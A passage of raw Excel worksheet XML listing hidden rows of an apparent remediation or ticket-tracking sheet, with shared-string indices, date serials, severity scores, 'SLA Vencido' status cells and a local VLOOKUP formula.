      <c r="AH106" t="str">
        <f>IFERROR(VLOOKUP(H106,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="107" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A107" s="5">
        <v>106</v>
      </c>
      <c r="B107" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C107" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D107" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E107" s="4"/>
      <c r="F107" s="4"/>
      <c r="G107" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H107" s="4"/>
      <c r="I107" s="4"/>
      <c r="J107" s="4" t="s">
        <v>430</v>
      </c>
      <c r="K107" s="4"/>
      <c r="L107" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M107" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N107" s="5"/>
      <c r="O107" s="6"/>
      <c r="P107" s="6"/>
      <c r="Q107" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R107" s="4"/>
      <c r="S107" s="22"/>
      <c r="T107" s="8">
        <v>43936</v>
      </c>
      <c r="U107" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2273</v>
      </c>
      <c r="V107" s="8">
        <f t="shared" si="4"/>
        <v>44056</v>
      </c>
      <c r="W107" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X107" s="11"/>
      <c r="Y107" s="11"/>
      <c r="Z107" s="11"/>
      <c r="AA107" s="8">
        <v>44113</v>
      </c>
      <c r="AB107" s="9" t="s">
        <v>428</v>
      </c>
      <c r="AC107" s="9" t="s">
        <v>431</v>
      </c>
      <c r="AD107" s="32"/>
      <c r="AE107" s="8">
        <v>44119</v>
      </c>
      <c r="AF107" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG107" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH107" t="str">
        <f>IFERROR(VLOOKUP(H107,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="108" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A108" s="5">
        <v>107</v>
      </c>
      <c r="B108" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C108" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D108" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E108" s="4" t="s">
        <v>432</v>
      </c>
      <c r="F108" s="4"/>
      <c r="G108" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H108" s="4"/>
      <c r="I108" s="4"/>
      <c r="J108" s="4" t="s">
        <v>433</v>
      </c>
      <c r="K108" s="4"/>
      <c r="L108" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M108" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N108" s="5"/>
      <c r="O108" s="6"/>
      <c r="P108" s="6"/>
      <c r="Q108" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R108" s="4"/>
      <c r="S108" s="22"/>
      <c r="T108" s="8">
        <v>43936</v>
      </c>
      <c r="U108" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2273</v>
      </c>
      <c r="V108" s="8">
        <f t="shared" si="4"/>
        <v>44056</v>
      </c>
      <c r="W108" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X108" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y108" s="11" t="s">
        <v>206</v>
      </c>
      <c r="Z108" s="11" t="s">
        <v>318</v>
      </c>
      <c r="AA108" s="8">
        <v>44174</v>
      </c>
      <c r="AB108" s="9" t="s">
        <v>434</v>
      </c>
      <c r="AC108" s="9" t="s">
        <v>435</v>
      </c>
      <c r="AD108" s="32"/>
      <c r="AE108" s="8">
        <v>44170</v>
      </c>
      <c r="AF108" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG108" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH108" t="str">
        <f>IFERROR(VLOOKUP(H108,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="109" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A109" s="5">
        <v>108</v>
      </c>
      <c r="B109" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C109" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D109" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E109" s="4"/>
      <c r="F109" s="4"/>
      <c r="G109" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H109" s="4" t="s">
        <v>436</v>
      </c>
      <c r="I109" s="4"/>
      <c r="J109" s="4" t="s">
        <v>437</v>
      </c>
      <c r="K109" s="4"/>
      <c r="L109" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M109" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N109" s="5"/>
      <c r="O109" s="6"/>
      <c r="P109" s="6"/>
      <c r="Q109" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R109" s="4"/>
      <c r="S109" s="22"/>
      <c r="T109" s="8">
        <v>44095</v>
      </c>
      <c r="U109" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2114</v>
      </c>
      <c r="V109" s="8">
        <f t="shared" si="4"/>
        <v>44185</v>
      </c>
      <c r="W109" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X109" s="12"/>
      <c r="Y109" s="11"/>
      <c r="Z109" s="11"/>
      <c r="AA109" s="8"/>
      <c r="AB109" s="9" t="s">
        <v>438</v>
      </c>
      <c r="AC109" s="9" t="s">
        <v>439</v>
      </c>
      <c r="AD109" s="32"/>
      <c r="AE109" s="8"/>
      <c r="AF109" s="27" t="s">
        <v>440</v>
      </c>
      <c r="AG109" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH109" t="str">
        <f>IFERROR(VLOOKUP(H109,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="110" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A110" s="5">
        <v>109</v>
      </c>
      <c r="B110" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C110" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D110" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E110" s="4"/>
      <c r="F110" s="4"/>
      <c r="G110" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H110" s="4" t="s">
        <v>441</v>
      </c>
      <c r="I110" s="4"/>
      <c r="J110" s="4" t="s">
        <v>437</v>
      </c>
      <c r="K110" s="4"/>
      <c r="L110" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M110" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N110" s="5"/>
      <c r="O110" s="6"/>
      <c r="P110" s="6"/>
      <c r="Q110" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R110" s="4"/>
      <c r="S110" s="22"/>
      <c r="T110" s="8">
        <v>44095</v>
      </c>
      <c r="U110" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2114</v>
      </c>
      <c r="V110" s="8">
        <f t="shared" si="4"/>
        <v>44185</v>
      </c>
      <c r="W110" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X110" s="12"/>
      <c r="Y110" s="11"/>
      <c r="Z110" s="11"/>
      <c r="AA110" s="8"/>
      <c r="AB110" s="9" t="s">
        <v>442</v>
      </c>
      <c r="AC110" s="9" t="s">
        <v>439</v>
      </c>
      <c r="AD110" s="32"/>
      <c r="AE110" s="8"/>
      <c r="AF110" s="31"/>
      <c r="AG110" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH110" t="str">
        <f>IFERROR(VLOOKUP(H110,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="111" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A111" s="5">
        <v>110</v>
      </c>
      <c r="B111" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C111" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D111" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E111" s="4"/>
      <c r="F111" s="4"/>
      <c r="G111" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H111" s="4" t="s">
        <v>443</v>
      </c>
      <c r="I111" s="4"/>
      <c r="J111" s="4" t="s">
        <v>437</v>
      </c>
      <c r="K111" s="4"/>
      <c r="L111" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M111" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N111" s="5"/>
      <c r="O111" s="6"/>
      <c r="P111" s="6"/>
      <c r="Q111" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R111" s="4"/>
      <c r="S111" s="22"/>
      <c r="T111" s="8">
        <v>44095</v>
      </c>
      <c r="U111" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2114</v>
      </c>
      <c r="V111" s="8">
        <f t="shared" si="4"/>
        <v>44185</v>
      </c>
      <c r="W111" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X111" s="12"/>
      <c r="Y111" s="11"/>
      <c r="Z111" s="11"/>
      <c r="AA111" s="8">
        <v>44250</v>
      </c>
      <c r="AB111" s="9" t="s">
        <v>444</v>
      </c>
      <c r="AC111" s="9" t="s">
        <v>439</v>
      </c>
      <c r="AD111" s="32"/>
      <c r="AE111" s="8">
        <v>44245</v>
      </c>
      <c r="AF111" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG111" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH111" t="str">
        <f>IFERROR(VLOOKUP(H111,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="112" spans="1:34" ht="261" hidden="1" x14ac:dyDescent="0.35">
      <c r="A112" s="5">
        <v>111</v>
      </c>
      <c r="B112" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C112" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D112" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E112" s="4"/>
      <c r="F112" s="4"/>
      <c r="G112" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H112" s="4" t="s">
        <v>446</v>
      </c>
      <c r="I112" s="4"/>
      <c r="J112" s="4" t="s">
        <v>437</v>
      </c>
      <c r="K112" s="4"/>
      <c r="L112" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M112" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N112" s="5"/>
      <c r="O112" s="6"/>
      <c r="P112" s="6"/>
      <c r="Q112" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R112" s="4"/>
      <c r="S112" s="22"/>
      <c r="T112" s="8">
        <v>44095</v>
      </c>
      <c r="U112" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2114</v>
      </c>
      <c r="V112" s="8">
        <f t="shared" si="4"/>
        <v>44185</v>
      </c>
      <c r="W112" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X112" s="12"/>
      <c r="Y112" s="11"/>
      <c r="Z112" s="11"/>
      <c r="AA112" s="8">
        <v>44784</v>
      </c>
      <c r="AB112" s="9" t="s">
        <v>448</v>
      </c>
      <c r="AC112" s="9" t="s">
        <v>439</v>
      </c>
      <c r="AD112" s="32"/>
      <c r="AE112" s="27" t="s">
        <v>449</v>
      </c>
      <c r="AF112" s="31"/>
      <c r="AG112" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH112" t="str">
        <f>IFERROR(VLOOKUP(H112,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="113" spans="1:34" ht="275.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A113" s="5">
        <v>112</v>
      </c>
      <c r="B113" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C113" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D113" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E113" s="4"/>
      <c r="F113" s="4"/>
      <c r="G113" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H113" s="4" t="s">
        <v>450</v>
      </c>
      <c r="I113" s="4"/>
      <c r="J113" s="4" t="s">
        <v>451</v>
      </c>
      <c r="K113" s="4"/>
      <c r="L113" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M113" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N113" s="5"/>
      <c r="O113" s="6"/>
      <c r="P113" s="6"/>
      <c r="Q113" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R113" s="4"/>
      <c r="S113" s="22"/>
      <c r="T113" s="8">
        <v>44095</v>
      </c>
      <c r="U113" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2114</v>
      </c>
      <c r="V113" s="8">
        <f t="shared" si="4"/>
        <v>44185</v>
      </c>
      <c r="W113" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X113" s="12"/>
      <c r="Y113" s="11"/>
      <c r="Z113" s="11"/>
      <c r="AA113" s="8">
        <v>44242</v>
      </c>
      <c r="AB113" s="32" t="s">
        <v>452</v>
      </c>
      <c r="AC113" s="32" t="s">
        <v>453</v>
      </c>
      <c r="AD113" s="32"/>
      <c r="AE113" s="8">
        <v>44171</v>
      </c>
      <c r="AF113" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG113" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH113" t="str">
        <f>IFERROR(VLOOKUP(H113,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="114" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A114" s="5">
        <v>113</v>
      </c>
      <c r="B114" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C114" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D114" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E114" s="4"/>
      <c r="F114" s="4"/>
      <c r="G114" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H114" s="4" t="s">
        <v>454</v>
      </c>
      <c r="I114" s="4"/>
      <c r="J114" s="4" t="s">
        <v>455</v>
      </c>
      <c r="K114" s="4"/>
      <c r="L114" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M114" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N114" s="5"/>
      <c r="O114" s="6"/>
      <c r="P114" s="6"/>
      <c r="Q114" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R114" s="4"/>
      <c r="S114" s="22"/>
      <c r="T114" s="8">
        <v>43729</v>
      </c>
      <c r="U114" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2480</v>
      </c>
      <c r="V114" s="8">
        <f t="shared" si="4"/>
        <v>43819</v>
      </c>
      <c r="W114" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X114" s="12"/>
      <c r="Y114" s="11"/>
      <c r="Z114" s="11"/>
      <c r="AA114" s="8">
        <v>44784</v>
      </c>
      <c r="AB114" s="32" t="s">
        <v>456</v>
      </c>
      <c r="AC114" s="32" t="s">
        <v>457</v>
      </c>
      <c r="AD114" s="32"/>
      <c r="AE114" s="27" t="s">
        <v>449</v>
      </c>
      <c r="AF114" s="31"/>
      <c r="AG114" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH114" t="str">
        <f>IFERROR(VLOOKUP(H114,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="115" spans="1:34" ht="174" hidden="1" x14ac:dyDescent="0.35">
      <c r="A115" s="5">
        <v>114</v>
      </c>
      <c r="B115" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C115" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D115" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E115" s="4"/>
      <c r="F115" s="4"/>
      <c r="G115" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H115" s="4" t="s">
        <v>458</v>
      </c>
      <c r="I115" s="4"/>
      <c r="J115" s="4" t="s">
        <v>459</v>
      </c>
      <c r="K115" s="4"/>
      <c r="L115" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M115" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N115" s="5"/>
      <c r="O115" s="6"/>
      <c r="P115" s="6"/>
      <c r="Q115" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R115" s="4"/>
      <c r="S115" s="22"/>
      <c r="T115" s="8">
        <v>44099</v>
      </c>
      <c r="U115" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2110</v>
      </c>
      <c r="V115" s="8">
        <f t="shared" si="4"/>
        <v>44219</v>
      </c>
      <c r="W115" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X115" s="12"/>
      <c r="Y115" s="11"/>
      <c r="Z115" s="11"/>
      <c r="AA115" s="8">
        <v>44119</v>
      </c>
      <c r="AB115" s="32" t="s">
        <v>460</v>
      </c>
      <c r="AC115" s="32" t="s">
        <v>461</v>
      </c>
      <c r="AD115" s="32"/>
      <c r="AE115" s="8"/>
      <c r="AF115" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG115" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH115" t="str">
        <f>IFERROR(VLOOKUP(H115,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="116" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A116" s="5">
        <v>115</v>
      </c>
      <c r="B116" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C116" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D116" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E116" s="4"/>
      <c r="F116" s="4"/>
      <c r="G116" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H116" s="4" t="s">
        <v>462</v>
      </c>
      <c r="I116" s="4"/>
      <c r="J116" s="4" t="s">
        <v>459</v>
      </c>
      <c r="K116" s="4"/>
      <c r="L116" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M116" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N116" s="5"/>
      <c r="O116" s="6"/>
      <c r="P116" s="6"/>
      <c r="Q116" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R116" s="4"/>
      <c r="S116" s="22"/>
      <c r="T116" s="8">
        <v>44103</v>
      </c>
      <c r="U116" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2106</v>
      </c>
      <c r="V116" s="8">
        <f t="shared" si="4"/>
        <v>44223</v>
      </c>
      <c r="W116" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X116" s="12"/>
      <c r="Y116" s="11"/>
      <c r="Z116" s="11"/>
      <c r="AA116" s="8">
        <v>44467</v>
      </c>
      <c r="AB116" s="32" t="s">
        <v>463</v>
      </c>
      <c r="AC116" s="32" t="s">
        <v>464</v>
      </c>
      <c r="AD116" s="32"/>
      <c r="AE116" s="8">
        <v>44427</v>
      </c>
      <c r="AF116" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG116" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH116" t="str">
        <f>IFERROR(VLOOKUP(H116,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="117" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A117" s="5">
        <v>116</v>
      </c>
      <c r="B117" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C117" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D117" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E117" s="4"/>
      <c r="F117" s="4"/>
      <c r="G117" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H117" s="4" t="s">
        <v>465</v>
      </c>
      <c r="I117" s="4"/>
      <c r="J117" s="4" t="s">
        <v>466</v>
      </c>
      <c r="K117" s="4"/>
      <c r="L117" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M117" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N117" s="5"/>
      <c r="O117" s="6"/>
      <c r="P117" s="6"/>
      <c r="Q117" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R117" s="4"/>
      <c r="S117" s="22"/>
      <c r="T117" s="8">
        <v>44103</v>
      </c>
      <c r="U117" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2106</v>
      </c>
      <c r="V117" s="8">
        <f t="shared" si="4"/>
        <v>44193</v>
      </c>
      <c r="W117" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X117" s="12"/>
      <c r="Y117" s="11"/>
      <c r="Z117" s="11"/>
      <c r="AA117" s="8">
        <v>44271</v>
      </c>
      <c r="AB117" s="32" t="s">
        <v>467</v>
      </c>
      <c r="AC117" s="32" t="s">
        <v>468</v>
      </c>
      <c r="AD117" s="32"/>
      <c r="AE117" s="8"/>
      <c r="AF117" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG117" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH117" t="str">
        <f>IFERROR(VLOOKUP(H117,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="118" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A118" s="5">
        <v>117</v>
      </c>
      <c r="B118" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C118" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D118" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E118" s="4"/>
      <c r="F118" s="4"/>
      <c r="G118" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H118" s="4" t="s">
        <v>469</v>
      </c>
      <c r="I118" s="4"/>
      <c r="J118" s="4" t="s">
        <v>455</v>
      </c>
      <c r="K118" s="4"/>
      <c r="L118" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M118" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N118" s="5"/>
      <c r="O118" s="6"/>
      <c r="P118" s="6"/>
      <c r="Q118" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R118" s="4"/>
      <c r="S118" s="22"/>
      <c r="T118" s="8">
        <v>44111</v>
      </c>
      <c r="U118" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2098</v>
      </c>
      <c r="V118" s="8">
        <f t="shared" si="4"/>
        <v>44201</v>
      </c>
      <c r="W118" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X118" s="12"/>
      <c r="Y118" s="11"/>
      <c r="Z118" s="11"/>
      <c r="AA118" s="8">
        <v>44113</v>
      </c>
      <c r="AB118" s="32" t="s">
        <v>470</v>
      </c>
      <c r="AC118" s="32" t="s">
        <v>457</v>
      </c>
      <c r="AD118" s="32"/>
      <c r="AE118" s="8">
        <v>44119</v>
      </c>
      <c r="AF118" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG118" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH118" t="str">
        <f>IFERROR(VLOOKUP(H118,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="119" spans="1:34" ht="304.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A119" s="5">
        <v>118</v>
      </c>
      <c r="B119" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C119" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D119" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E119" s="4"/>
      <c r="F119" s="4"/>
      <c r="G119" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H119" s="4" t="s">
        <v>471</v>
      </c>
      <c r="I119" s="4" t="s">
        <v>472</v>
      </c>
      <c r="J119" s="4" t="s">
        <v>473</v>
      </c>
      <c r="K119" s="4"/>
      <c r="L119" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M119" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N119" s="5">
        <v>6.5</v>
      </c>
      <c r="O119" s="6"/>
      <c r="P119" s="6"/>
      <c r="Q119" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R119" s="4"/>
      <c r="S119" s="22"/>
      <c r="T119" s="8">
        <v>44152</v>
      </c>
      <c r="U119" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2057</v>
      </c>
      <c r="V119" s="8">
        <f t="shared" si="4"/>
        <v>44242</v>
      </c>
      <c r="W119" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X119" s="12"/>
      <c r="Y119" s="11"/>
      <c r="Z119" s="11"/>
      <c r="AA119" s="8">
        <v>44235</v>
      </c>
      <c r="AB119" s="32" t="s">
        <v>474</v>
      </c>
      <c r="AC119" s="32" t="s">
        <v>475</v>
      </c>
      <c r="AD119" s="32" t="s">
        <v>476</v>
      </c>
      <c r="AE119" s="8">
        <v>44219</v>
      </c>
      <c r="AF119" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG119" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH119" t="str">
        <f>IFERROR(VLOOKUP(H119,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="120" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A120" s="5">
        <v>119</v>
      </c>
      <c r="B120" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C120" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D120" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E120" s="4"/>
      <c r="F120" s="4"/>
      <c r="G120" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H120" s="4" t="s">
        <v>477</v>
      </c>
      <c r="I120" s="4" t="s">
        <v>478</v>
      </c>
      <c r="J120" s="4" t="s">
        <v>479</v>
      </c>
      <c r="K120" s="4"/>
      <c r="L120" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M120" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N120" s="5">
        <v>3.7</v>
      </c>
      <c r="O120" s="6"/>
      <c r="P120" s="6"/>
      <c r="Q120" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R120" s="4"/>
      <c r="S120" s="22"/>
      <c r="T120" s="8">
        <v>44152</v>
      </c>
      <c r="U120" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2057</v>
      </c>
      <c r="V120" s="8">
        <f t="shared" si="4"/>
        <v>44272</v>
      </c>
      <c r="W120" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X120" s="12"/>
      <c r="Y120" s="11"/>
      <c r="Z120" s="11"/>
      <c r="AA120" s="8">
        <v>44251</v>
      </c>
      <c r="AB120" s="32" t="s">
        <v>480</v>
      </c>
      <c r="AC120" s="32" t="s">
        <v>481</v>
      </c>
      <c r="AD120" s="32" t="s">
        <v>482</v>
      </c>
      <c r="AE120" s="8">
        <v>44244</v>
      </c>
      <c r="AF120" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG120" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH120" t="str">
        <f>IFERROR(VLOOKUP(H120,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="121" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A121" s="5">
        <v>120</v>
      </c>
      <c r="B121" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C121" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D121" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E121" s="4"/>
      <c r="F121" s="4"/>
      <c r="G121" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H121" s="4" t="s">
        <v>483</v>
      </c>
      <c r="I121" s="4" t="s">
        <v>484</v>
      </c>
      <c r="J121" s="4" t="s">
        <v>485</v>
      </c>
      <c r="K121" s="4"/>
      <c r="L121" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M121" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N121" s="5">
        <v>3.7</v>
      </c>
      <c r="O121" s="6"/>
      <c r="P121" s="6"/>
      <c r="Q121" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R121" s="4"/>
      <c r="S121" s="22"/>
      <c r="T121" s="8">
        <v>44152</v>
      </c>
      <c r="U121" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2057</v>
      </c>
      <c r="V121" s="8">
        <f t="shared" si="4"/>
        <v>44272</v>
      </c>
      <c r="W121" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X121" s="12"/>
      <c r="Y121" s="11"/>
      <c r="Z121" s="11"/>
      <c r="AA121" s="8">
        <v>44235</v>
      </c>
      <c r="AB121" s="32" t="s">
        <v>486</v>
      </c>
      <c r="AC121" s="32" t="s">
        <v>487</v>
      </c>
      <c r="AD121" s="32" t="s">
        <v>488</v>
      </c>
      <c r="AE121" s="8">
        <v>44219</v>
      </c>
      <c r="AF121" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG121" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH121" t="str">
        <f>IFERROR(VLOOKUP(H121,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="122" spans="1:34" ht="116" hidden="1" x14ac:dyDescent="0.35">
      <c r="A122" s="5">
        <v>121</v>
      </c>
      <c r="B122" s="21" t="s">
